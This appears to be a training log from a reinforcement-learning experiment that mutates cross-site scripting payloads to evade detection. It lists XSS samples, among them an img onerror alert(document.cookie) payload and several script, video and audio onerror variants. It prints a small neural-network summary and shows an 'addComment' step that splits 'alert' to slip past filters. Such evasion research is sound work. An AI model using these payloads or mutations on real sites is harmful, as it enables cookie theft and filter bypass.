…
Add xss sample:<img src=asdf onerror=alert(document.cookie)>
Add xss sample:<script>alert(1)</script>
Add xss sample:"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
Add xss sample:<video src=1 onerror=alert(1)>
Add xss sample:<audio src=1 onerror=alert(1)>
reset current_sample=<![><img src="]><img src=x onerror=alert(XSS)//">
nb_actions:
4
env.observation_space.shape:
(1, 257)
5
_________________________________________________________________
Layer (type)                 Output Shape              Param #   
=================================================================
flatten_1 (Flatten)          (None, 257)               0         
_________________________________________________________________
dropout_1 (Dropout)          (None, 257)               0         
_________________________________________________________________
dense_1 (Dense)              (None, 5)                 1290      
_________________________________________________________________
batch_normalization_1 (Batch (None, 5)                 20        
_________________________________________________________________
elu_1 (ELU)                  (None, 5)                 0         
_________________________________________________________________
dense_2 (Dense)              (None, 4)                 24        
_________________________________________________________________
activation_1 (Activation)    (None, 4)                 0         
=================================================================
Total params: 1,334
Trainable params: 1,324
Non-trainable params: 10
_________________________________________________________________
None
Training for 100 steps ...
reset current_sample=<--`<img/src=` onerror=alert(1)> --!>
current sample:<--`<img/src=` onerror=alert(1)> --!>
action is addComment
Do action :addComment
current sample:<--`<img/src=` onerror=a/*8888*/lert(1)> --!>
…
